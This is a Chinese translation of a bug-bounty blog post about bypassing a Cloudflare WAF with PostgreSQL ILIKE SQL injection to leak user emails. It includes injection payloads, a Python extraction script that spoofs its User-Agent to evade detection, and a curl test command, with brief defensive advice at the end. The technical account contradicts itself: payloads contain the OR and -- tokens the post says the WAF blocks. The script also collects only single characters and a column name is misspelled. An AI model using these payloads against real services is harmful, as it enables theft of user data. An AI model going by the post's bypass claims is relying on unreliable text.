---
title: 我使用了一个简单的SQL小技巧绕过了CloudFare的防火墙
category:
  - 搬运
  - 红队
  - Medium
tags:
  - 红队
  - AI-Powered
  - PostgreSQL
  - ILIKE关键字绕过
  - SQL注入
date: 2025-08-06
author: Ibtissam hammadi
footer: 版权及浏览收益为原作者所有。如侵犯版权，请通知译者尽快删除
---
:::info
- **原作者**：**Ibtissam hammadi**
- **原作者个人主页**：[https://medium.com/@ibtissamhammadi1](https://medium.com/@ibtissamhammadi1)
- **原文标题**：**I Bypassed a Strict WAF Using Simple SQL Tricks**
- **原文链接**：[https://medium.com/@ibtissamhammadi1/i-bypassed-a-strict-waf-using-simple-sql-tricks-2fafc3d5697f](https://medium.com/@ibtissamhammadi1/i-bypassed-a-strict-waf-using-simple-sql-tricks-2fafc3d5697f)
:::
:::important
原文为**Member Only**会员制博文
:::
[[toc]]
## 引言 
挖洞时，CloudFare防火墙是一堵冰冷的墙，我和我的Payload在这边，SQL漏洞在那边

屡战屡败三小时后，一个**PostgreSQL技巧**泄露出了敏感邮箱而没有触发任何告警。这一开始只是一个 *无关紧要* 的BUG，却最终变成一个**高危漏洞** —— 下面请看我如何做到这件事

## 到手的SQL注入漏洞差点跑了
### 初步测试
一个看起来人畜无害的公共API端点 （只是用来查询用户资料的搜索函数），如果输入一个**单引号**` ' `，奇怪的事情便发生了： *响应明显变慢，然后返回一个空的查询结果*

很多黑客大概都会扭头就走，但**像这样的响应延迟通常意味着一个不明显的==SQL注入漏洞==**

### WAF试探
最初的尝试都失败了：
- `' OR 1=1--` -> CF直接拦截了
- **SQLMap** -> 被WAF拿下IP
- **UNION联合查询注入** -> 也都失败了

没有任何回显的SQL注入让这一切都像是一个*死胡同*——但**被藏起来的报错**也说明还没有人发现这个问题

## PostgreSQL技巧是如何绕过WAF的
### 为什么`ILIKE`能用而其他关键字都用不了
CloudFlare防火墙会直接拦截含有下面文本的Payload：
- `OR`关键字
- `=` 符号
- `--` 注释符
但却忽略了`ILIKE`——PostgreSQL的大小写不敏感匹配符。鉴于`ILIKE`很少用于渗透测试中，WAF会认为`ILIKE`是合法的查询

### 对症下药，构造Payload
一开始的Payload很简单：
```sql
' OR username ILIKE 'admin'--
```
页面随后返回了 *admin用户的资料页*

但要想泄露出**所有邮箱**，需要一个更聪明的路子：
```sql
' OR email ILIKE 'a%'--
```
这将泄露出所有以字母`a`开头的邮箱

### 扩大攻击面
1. 遍历所有字符（`a%`、`b%`等等）以匹配所有有效的邮箱
2. 使用**链式条件**提取所有邮箱
	```sql
	' OR (emali ILIKE 'a%' AND email ILIKE '%@domain.com')--
```
3.  **自动化渗透测试流程**（待会再深入）

### 为什么这可以绕过CF
- **OWASP WAF防火墙**默认配置漏掉了`ILIKE`
- 没有可疑的符号（`=`、`--`）就意味着不会携带攻击特征

## Python主力快速渗透测试
**人生苦短，我用Python**

手动测试每个起始字符实在是费力。因此，不妨使用Python自动化这一步：
```Python
import requests  
  
target_url = "https://api.example.com/search"  
headers = {"User-Agent": "Mozilla/5.0"}  # Spoofing UA helped evade WAF  
  
def extract_emails():  
    emails = []  
    charset = "abcdefghijklmnopqrstuvwxyz0123456789._-@"  
      
    for char in charset:  
        payload = f"' OR email ILIKE '{char}%'--"  
        response = requests.post(target_url, data={"query": payload}, headers=headers)  
          
        if "user found" in response.text:  
            emails.append(char)  
      
    return emails  
  
print(extract_emails())
```
**编写脚本时的技巧**：
- **UA变换** （避免被WAF检测到Python requests默认指纹）
- **遍历字符集用于爆破** （慢归慢，但确实能用）
- **不要捕获报错** （脚本没崩就说明没有触发告警）

## ”这不是SQL注……噢，好吧“
### BBP一开始拒绝了我的报告
漏洞赏金项目一开始**拒绝了我的漏洞报告**：
- ”*这只是特性，不是SQL注入漏洞* “
- ” *没有触发告警就不是漏洞* “

### 我如何证明这是一个严重漏洞
1. **录制视频**演示如何提取邮箱
2. 详细地**介绍了`ILIKE`技巧**
3. **引用OWASP WAF绕过技巧**

**后续：** **Immunefi**平台介入，BBP项目给了我5000美刀赏金

## 忠告 && 慰藉
### 对于白帽黑客
✔***沉默的报错* 亦是金矿** —— 很多黑客都会忽略这一带你
✔WAF亦有盲点 —— `ILIKE`、`SIMILAR TO`和`JSON`函数都不一定会触发告警
✔**脚本只会增加手撕的时间** —— SQLMap失败的时候，想象力就应该介入了

### 对于开发者
✔ **毫无疑问 参数化查询才是正道**
✔ 设置白名单SQL操作符 （例如，如果用不到的话就ban掉`ILIKE`）
✔ **将所有SQL查询都录入日志** —— 即使是那些 *看似人畜无害* 的查询

## 自己试一试！
想试试这个技巧吗？试一下下面的模拟Demo API吧：
```shell
curl -X PoST "https://demo-api.com/search" -d "query=test' OR 1=1--"
```
*备注：这只是一个mock站点 —— 不会返回真实数据*

## 总结
这不只是在介绍一个**WAF 绕过技巧** —— 也是在讨论如何**不走寻常路**
BUG一直都藏在眼皮子底下，等待着某人发问：”***为什么普适的规则没用在这里？***“

**喜欢我的博文的话，请点赞👏、分享我的博文，并关注我的更多白帽黑客技巧**


